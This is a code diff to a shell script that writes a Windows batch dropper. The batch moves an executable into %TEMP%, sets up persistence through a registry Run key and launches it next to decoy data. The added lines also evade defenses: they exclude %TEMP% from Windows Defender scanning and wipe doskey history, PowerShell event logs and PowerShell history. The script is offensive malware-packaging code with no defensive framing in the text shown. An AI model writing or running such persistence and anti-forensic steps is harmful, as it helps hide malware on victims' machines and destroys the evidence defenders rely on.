@@ -21,14 +21,23 @@ cp DEVOBJ.dll $ARCHIVE
 
 BIN=$(basename $BIN_PATH)
 DATA=$(basename $DATA_PATH)
+PROGRAM_NAME=$(echo $BIN | cut -d. -f1 )
 
 mv $BIN $ARCHIVE
 mv $DATA $ARCHIVE
 
 # move pe to temp folder
 echo "move $BIN %TEMP%\\$BIN" > data.bat
-# create schedules task for pe
-echo "schtasks /create /sc ONSTART /tn $(echo $BIN | cut -d. -f1 ) /tr %TEMP%\\$BIN" >> data.bat
+# add registry run key for for pe
+echo "reg add \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\" /v $PROGRAM_NAME /t REG_SZ /d \"%TEMP%\\$BIN\"" >> data.bat
+# clear doskey history (just in case)
+echo "doskey /listsize=0" >> data.bat
+# set temp folder as exclusion path
+echo 'powershell -c Add-MpPreference -ExclusionPath $Env:TEMP' >> data.bat
+# clear powershell event logs
+echo "powershell -c Clear-EventLog \"Windows PowerShell\"" >> data.bat
+# clear powershell history
+echo "powershell -c Remove-Item (Get-PSReadlineOption).HistorySavePath" >> data.bat
 # start pe
 echo "%TEMP%\\$BIN" >> data.bat
 # start dummy data
